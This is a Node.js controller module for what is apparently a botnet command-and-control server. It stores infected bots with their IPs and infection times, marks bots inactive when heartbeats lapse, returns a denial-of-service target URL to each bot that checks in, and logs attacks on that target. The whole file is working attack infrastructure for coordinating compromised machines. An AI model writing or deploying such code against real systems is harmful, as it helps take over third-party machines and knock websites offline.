// This module is used to manage and control the data stored on a server
// Typically this would be stored in a database, but for our purposes we're simply storing the data in memory
// All functions are exported for thier intended use in the handleRoutes.js module.

// Imported modules for this file
const moment = require('moment')
const debug = require('debug')('server:bots-controller')
const chalk = require('chalk')

// BOT model
let bot = {
  ip: '',
  infectedByIp: '',
  infectedTime: '',
  infectedTimeDisplay: '',
  lastHeartbeat: '',
  lastHeartbeatDisplay: '',
  active: true
}

// Data to be stored in memory
let bots = []             // Array of bots
let target                // Target URL for DoS attack
let attacks = []          // List of individual attacks to target URL

// Function used to return the bots array. 
// Before returning, it iterates through each bot to check if it's last heartbeat is within the last minute
// If heartbeat is not within last minute, will set the bots active value to false
// RETURNS: bots
function getBots() {
  var check = moment().subtract(1, "minutes")
  bots.forEach(bot => {
    if (moment(bot.lastHeartbeat).isBefore(check)){
      bot.active = false
    }
  })
  return bots
}

// Function used to return the target URL
// RETURNS: target
function getTarget() {
  return target
}

// Function used to set the target URL
// RETURNS: target
function setTarget(url) {
  target = url
  return url
}

// Function used to add a bot to the bots array
// First, checks to see if the bot exists
// If exists, returns false
// If doesn't exist, add infectedTime and last Heartbeat time to incoming bot object and adds new bot to bots array
// PARAMETERS: bot
// RETURNS: Boolean
function add(bot) {
  let exists = bots.find(b => b.ip === bot.ip)
  if (exists) {
    debug(`${chalk.redBright('Bot already exists')}`)
    return false
  } else {
    bot.infectedTime = moment()
    bot.infectedTimeDisplay = moment().format('L, LTS')
    bot.lastHeartbeat = moment()
    bot.lastHeartbeatDisplay = moment().format('L, LTS')
    bot.active = true
    // debug(bot)
    bots.push(bot)
    debug(`New Bot': ${chalk.green(bot.ip)}`)
    debug(`Count: ${bots.length}`)
    // debug(bots)
    return true
  }
}

// Function used update heartbeat for bot
// First, takes ip param to find bot in bots array. 
// If doesn't exist, returns 'Bot does not exists yet'
// Else, update lastHeartbeat with current time and active to true
//      If a target exists, return the target.  Else return 'No Target'
// PARAMS: ip
// RETURN: String
function heartbeat(ip) {
  let i = bots.findIndex(b => b.ip === ip)
  if (i !== -1) {
    bots[i].lastHeartbeat = moment()
    bots[i].lastHeartbeatDisplay = moment().format('L, LTS')
    bots[i].active = true
    if (target) {
      return target
    } else {
      return 'No Target'
    }
    
  } else {
    return 'Bot does not exist yet'
  }
}

// Function used to document an attack from a bot to the target URL
// If a target exists, will set an attack object with the a param and the current time and add to attacks array
// PARAMS: a
// RETURN: Boolean
function documentAttack(a) {
  if (getTarget()) {
    let attack = {
    agent: a,
    time: moment(),
    timeDisplay: moment().format('L, LTS')
    }
    attacks.push(attack)
    return true
  } else {
    return false
  }
}

// Function used to return attacks array 
// Will return attacks array if an attack exists in the array
// RETURN: attacks || String
function getAttacks() {
  if (attacks.length > 0) {
    return attacks
  } else {
    return 'No Attacks'
  }
}

module.exports ={ getBots, getTarget, setTarget, add, heartbeat, documentAttack, getAttacks}